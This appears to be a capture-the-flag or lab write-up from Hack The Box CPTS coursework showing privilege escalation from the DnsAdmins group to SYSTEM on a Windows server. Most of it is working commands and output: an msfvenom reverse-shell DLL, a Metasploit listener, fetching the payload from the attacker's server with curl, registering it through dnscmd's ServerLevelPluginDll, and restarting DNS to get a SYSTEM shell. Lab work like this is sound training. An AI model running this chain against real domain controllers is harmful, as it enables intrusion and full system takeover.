Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller.

- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/WinPE]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.0 LPORT=4444 EXITFUNC=thread -f dll -o rev_shell.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: rev_shell.dll
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/WinPE]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.0 LPORT=4444 EXITFUNC=thread -f dll -o rev_shell.dll

                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/WinPE]
└─$ msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD windows/x64/shell_reverse_tcp
PAYLOAD => windows/x64/shell_reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.15.0
lhost => 10.10.15.0
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > 

````
instead of adding a user we created a revshell payload.
and setup a msf listener in our machine and shared the file using a python server and curl.
```
└─$ python3 -m  http.server 8080 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.45.169 - - [02/Jul/2026 13:34:26] "GET /rev_shell.dll HTTP/1.1" 200 -

C:\Users\netadm>curl http://10.10.15.0:8080/rev_shell.dll -o rev_shell.dll
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9216  100  9216    0     0   9216      0  0:00:01 --:--:--  0:00:01 `14400
````

```
run this cmd to direct the path.

C:\Users\netadm>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\rev_shell.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

comparing to the academy module these steps are easy you just have to start and stop the dns. 
```

C:\Users\netadm>sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530

C:\Users\netadm>sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\netadm>sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4648
        FLAGS              :

C:\Users\netadm>sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\netadm>
```

Now you can check you listener you will have a session with nt authority priv.

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.0:4444 
[*] Command shell session 1 opened (10.10.15.0:4444 -> 10.129.45.169:56555) at 2026-07-02 13:50:52 +0530


Shell Banner:
Microsoft Windows [Version 10.0.17763.107]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system
````

now grab the flag.

```
C:\Windows\system32>type  c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
type  c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
````

